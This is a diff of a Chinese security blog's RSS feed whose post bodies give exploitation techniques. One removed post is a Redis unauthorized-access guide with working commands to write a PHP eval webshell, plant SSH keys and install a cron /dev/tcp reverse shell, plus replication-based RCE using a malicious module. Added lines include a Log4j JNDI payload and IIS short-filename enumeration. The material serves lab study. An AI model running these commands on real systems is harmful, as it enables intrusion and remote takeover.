-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/solr/admin/cores?action&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$&amp;#123;jndi&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;ldap&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;127.0.0.1&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;1389&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+            <pubDate>Sat, 30 Nov 2024 22:10:02 +0800</pubDate>
+            <description><![CDATA[ &lt;h4 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h4&gt;
+&lt;p&gt;为了兼容 16 位 MS-DOS 程序，Windows 为文件名较长的文件（和文件夹）生成了对应的 windows 8.3 短文件名。&lt;/p&gt;
+&lt;p&gt;在 Windows 下查看对应的短文件名，可以使用命令 dir /x&lt;/p&gt;
+&lt;p&gt;主要还是因为 windows 的短文件名枚举&lt;br /&gt;
+短文件名有以下特征：&lt;/p&gt;
+&lt;p&gt;1)   只有前六位字符直接显示，后续字符用～1 指代。其中数字 1 还可以递增，如果存在多个文件名类似的文件（名称前 6 位必须相同，且后缀名前 3 位必须相同）。&lt;/p&gt;
+&lt;p&gt;2)   后缀名最长只有 3 位，多余的被截断。&lt;/p&gt;
+&lt;p&gt;3)   访问构造的某个存在的短文件名，会返回 404&lt;/p&gt;
+&lt;p&gt;4)   访问构造的某个不存在的短文件名，会返回 400&lt;/p&gt;
+&lt;h4 id=&#34;利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用&lt;/h4&gt;
+&lt;p&gt;&lt;a href=&#34;http://www.xxx.com/abcde*~1*g**/a.aspx&#34;&gt;http://www.xxx.com/abcde*~1*g**/a.aspx&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;逐渐猜测 不仅可以爆破目录还可以爆破 文件&lt;/p&gt;
+ ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">https://k1t0111.github.io/2024/07/21/redis-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%A4%A7%E5%85%A8/</guid>
-            <title>redis_利用方式大全</title>
-            <link>https://k1t0111.github.io/2024/07/21/redis-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%A4%A7%E5%85%A8/</link>
+            <guid isPermalink="true">https://k1t0111.github.io/2024/11/30/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</guid>
+            <title>常见服务器解析漏洞</title>
+            <link>https://k1t0111.github.io/2024/11/30/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</link>
             <category>漏洞分析</category>
-            <pubDate>Sun, 21 Jul 2024 16:03:47 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240721160632.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;Redis 是一个 key-value 存储系统。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI C 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的 API。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;一、漏洞描述&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Redis 默认情况下，会绑定在 0.0.0.0:6379 (在 redis3.2 之后，redis 增加了 protected-mode，在这个模式下，非绑定 IP 或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等等，这样将会将 Redis 服务暴露在公网上，如果在没有设置密码认证 (默认为空) 的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者还可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务器登录目标服务器。&lt;/p&gt;
-&lt;p&gt;漏洞的产生条件有以下两点:&lt;/p&gt;
-&lt;p&gt;(1)    Redis 绑定在 0.0.0.0:6379, 且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网&lt;/p&gt;
-&lt;p&gt;(2)    没有设置密码认证（默认为空）或者弱密码，可以免密码登录 redis 服务&lt;/p&gt;
-&lt;p&gt;* 主要是利用 Redis 未授权访问，实现像目标主机写入 Webshell、SSH 公钥，或写入计划任务实现反弹 shell。&lt;/p&gt;
-&lt;h3 id=&#34;常规redis未授权分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常规redis未授权分析&#34;&gt;#&lt;/a&gt; 常规 redis 未授权分析&lt;/h3&gt;
-&lt;blockquote&gt;
-&lt;p&gt;作为一个数据库，redis 可以使用对应的客户端程序进行连接，如果存在未授权那么此时我们就可以根据无密码进行连接。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h5 id=&#34;写webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写webshell&#34;&gt;#&lt;/a&gt; 写 webshell&lt;/h5&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240720134805.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;* 相关命令执行:&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config get &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#查看 redis 数据库路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt; /root/redis-2.8.17&lt;span class=&#34;token comment&#34;&gt;# #修改靶机 Redis 数据库路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;其实更多的我感觉是要修改文件的存储路径,web服务的目录之下的文件才能被访问到&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; dbfilename shell.php &lt;span class=&#34;token comment&#34;&gt;#生成 shell.php 文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; xxx &lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&amp;lt;?php phpinfo();?&gt;&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&#34;&lt;/span&gt;#将一句话木马写入文件中&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#&#34;\r\n\r\n&#34; 是换行的意思，用 redis 写入文件会自带一些版本信息，如果不换行可能导致无法执行。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; xxx &lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&amp;lt;?php eval(&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;[whoami]);?&gt;&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&#34;&lt;/span&gt;#上传木马可以通过蚁剑连接&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;save&lt;span class=&#34;token comment&#34;&gt;#保存&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240720134858.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这是写入 webshell, 但是在我看来我们更需要把东西放到 web 目录之下&lt;/p&gt;
-&lt;h5 id=&#34;利用前提&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用前提&#34;&gt;#&lt;/a&gt; 利用前提&lt;/h5&gt;
-&lt;p&gt;1. 靶机 redis 链接未授权，在攻击机上能用 redis-cli 连上，如上图，并未登陆验证&lt;/p&gt;
-&lt;p&gt;2. 开了 web 服务器，并且知道路径（如利用 phpinfo，或者错误爆路经）&lt;/p&gt;
-&lt;p&gt;. 还需要具有文件读写增删改查权限（开启 web 服务器，就可以利用 url 使用蚁剑进行连接）&lt;/p&gt;
-&lt;h4 id=&#34;写ssh&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写ssh&#34;&gt;#&lt;/a&gt; 写 ssh&lt;/h4&gt;
-&lt;h6 id=&#34;利用前提-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用前提-2&#34;&gt;#&lt;/a&gt; 利用前提&lt;/h6&gt;
-&lt;p&gt;1. 当 redis 以 root 身份运行。*(我个人理解是因为.ssh 目录在 root 之中所以必须要 root)&lt;/p&gt;
-&lt;p&gt;2. 靶机 redis 链接未授权，在攻击机上能用 redis-cli 连上，如上图，并未登陆验证。&lt;/p&gt;
-&lt;p&gt;3. 存在 /root/.ssh 目录，如果不存在我们可以通过一句话木马连接蚁剑创建目录，不过可能进不去 root 目录，权限问题可能，或者自己 mkdir 一个目录毕竟是自己搭建靶场。因为.ssh 是隐藏目录可以通过 ls -la 查看有没有。&lt;/p&gt;
-&lt;p&gt;生成公私钥之后&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;type&lt;/span&gt; key.txt &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; redis-cli.exe &lt;span class=&#34;token parameter variable&#34;&gt;-h&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.43.141 &lt;span class=&#34;token parameter variable&#34;&gt;-x&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; xxx&lt;span class=&#34;token comment&#34;&gt;#如果是 linux 将 type 换成 cat&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#将公钥作为 value 插入到数据库中，key 随便啥值。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;redis-cli.exe &lt;span class=&#34;token parameter variable&#34;&gt;-h&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.43.141 config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt; /root/.ssh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#修改 redis 数据库路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;redis-cli.exe &lt;span class=&#34;token parameter variable&#34;&gt;-h&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.43.141 config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; dbfilename authorized_keys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#生成缓冲文件 authorized_keys&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;redis-cli.exe &lt;span class=&#34;token parameter variable&#34;&gt;-h&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.43.141 save&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#保存&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; id_rsa root@192.168.43.141&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;其实语句都大差不差，都是切换目录生成对应文件，之后写入对应内容。&lt;/p&gt;
-&lt;h4 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; 反弹 shell&lt;/h4&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;redis-cli.exe &lt;span class=&#34;token parameter variable&#34;&gt;-h&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.43.141&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt; /var/spool/cron/crontabs&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; dbfilename root&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; xxx &lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;* * * * * /bin/bash -i&gt;&amp;amp;/dev/tcp/192.168.43.102/8888 0&gt;&amp;amp;1&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n 是换行前面已经说过，因为 redis 会出现乱码，可以通过上传的 root 文件看到有乱码。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;save&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;反弹失误情况&lt;/th&gt;
-&lt;th&gt;&lt;a href=&#34;%E5%9F%BA%E7%A1%80/%E7%B3%BB%E7%BB%9F/Linux/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.md#%E5%8F%8D%E5%BC%B9%E5%A4%B1%E8%B4%A5&#34;&gt;反弹失败&lt;/a&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;/table&gt;
-&lt;h3 id=&#34;主从复制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主从复制&#34;&gt;#&lt;/a&gt; 主从复制&lt;/h3&gt;
-&lt;p&gt;Redis 主从复制是一种用于实现数据备份、读写分离和故障恢复的技术。在 Redis 中，可以通过配置一个或多个从服务器（Slave）来复制一个主服务器（Master）的数据。主从复制的基本工作原理如下：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;复制过程&lt;/strong&gt;：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;主服务器持续地将写操作命令（例如 SET、DEL）发送给所有连接的从服务器。&lt;/li&gt;
-&lt;li&gt;从服务器接收到命令后，执行相同的命令，从而使得从服务器的数据和主服务器保持一致。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;配置步骤&lt;/strong&gt;：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;在从服务器的配置文件中配置  &lt;code&gt;slaveof&lt;/code&gt;  参数，指定它要复制的主服务器的地址和端口。&lt;/li&gt;
-&lt;li&gt;从服务器连接到主服务器后，主服务器会创建一个后台线程来将数据发送给从服务器。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;用途&lt;/strong&gt;：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;数据备份&lt;/strong&gt;：从服务器可以用于备份主服务器的数据，以防止主服务器故障时的数据丢失。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;读写分离&lt;/strong&gt;：主服务器负责处理写操作，而从服务器可以处理读操作，从而提升整体的读写性能。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;故障恢复&lt;/strong&gt;：如果主服务器出现故障，可以将一个从服务器提升为新的主服务器，从而保证系统的高可用性。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;配置选项&lt;/strong&gt;：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;可以配置从服务器只接收部分数据库的数据（ &lt;code&gt;replica-serve-stale-data&lt;/code&gt; ）。&lt;/li&gt;
-&lt;li&gt;可以配置从服务器成为主服务器时是否清除原有数据（ &lt;code&gt;replica-read-only&lt;/code&gt; ）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h5 id=&#34;redis主从复制利用原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redis主从复制利用原理&#34;&gt;#&lt;/a&gt; Redis 主从复制利用原理&lt;/h5&gt;
-&lt;p&gt;首先，我们通过一个简单的测试，来熟悉一下 slave 和 master 的握手协议过程：&lt;/p&gt;
-&lt;p&gt;*1、监听本地 1234 端口&lt;/p&gt;
-&lt;p&gt;nc -lvvp 1234&lt;/p&gt;
-&lt;p&gt;*2、将 Redis 服务器设置为从节点 (slave)&lt;/p&gt;
-&lt;p&gt;slaveof 127.0.0.1 1234&lt;/p&gt;
-&lt;p&gt;*3、使用 nc 模拟 Redis 主服务器，进行模拟 Redis 主从交互过程（红色部分为 slave 发送的命令）：&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/894761/202006/894761-20200610224805141-1328077677.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;以上，通过 nc 进行模拟 Redis 主从复制的交互过程，同理，如果构建模拟一个 Redis 服务器，利用 Redis 主从复制的机制，那么就可以通过 FULLRESYNC 将任意文件同步到从节点&lt;/p&gt;
-&lt;h4 id=&#34;利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用&lt;/h4&gt;
-&lt;p&gt;在 Reids 4.x 之后，Redis 新增了模块功能，通过外部拓展，可以实现在 Redis 中实现一个新的 Redis 命令，通过写 C 语言编译并加载恶意的.so 文件，达到代码执行的目的。&lt;/p&gt;
-&lt;p&gt;通过脚本实现一键自动化 getshell：&lt;/p&gt;
-&lt;p&gt;1、生成恶意.so 文件，下载 RedisModules-ExecuteCommand 使用 make 编译即可生成。&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;git&lt;/span&gt; clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;cd&lt;/span&gt; RedisModules-ExecuteCommand/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;make&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;2、攻击端执行： python &lt;a href=&#34;http://redis-rce.py&#34;&gt;redis-rce.py&lt;/a&gt; -r 目标 ip-p 目标端口 -L 本地 ip -f &lt;a href=&#34;http://xn--5bu4m.so&#34;&gt;恶意.so&lt;/a&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;git&lt;/span&gt; clone https://github.com/Ridter/redis-rce.git&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;cd&lt;/span&gt; redis-rce/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cp&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;/RedisModules-ExecuteCommand/src/module.so ./&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pip &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; requirements.txt &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python redis-rce.py &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.28.152 &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6379&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-L&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.28.137 &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; module.so&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;工具地址&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具地址&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://github.com/Ridter/redis-rce&#34;&gt;工具地址&lt;/a&gt;&lt;/h4&gt;
-&lt;h2 id=&#34;ssrf-攻击redis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf-攻击redis&#34;&gt;#&lt;/a&gt; ssrf 攻击 redis&lt;/h2&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;联合 ssrf 进行攻击&lt;/th&gt;
-&lt;th&gt;&lt;a href=&#34;%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/top10%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/ssrf/SSRF.md#Redis%E5%8D%8F%E8%AE%AE&#34;&gt;Redis 协议&lt;/a&gt;&lt;/th&gt;
-&lt;th&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;/table&gt;
-&lt;p&gt;&lt;a href=&#34;https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3&#34;&gt;https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3&lt;/a&gt;&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;ssrf 实践训练&lt;/th&gt;
-&lt;th&gt;&lt;a href=&#34;%E9%9D%B6%E6%9C%BA/CTFHUB/%E5%9F%BA%E7%A1%80%E8%AE%AD%E7%BB%83/ssrf.md&#34;&gt;ssrf&lt;/a&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;/table&gt;
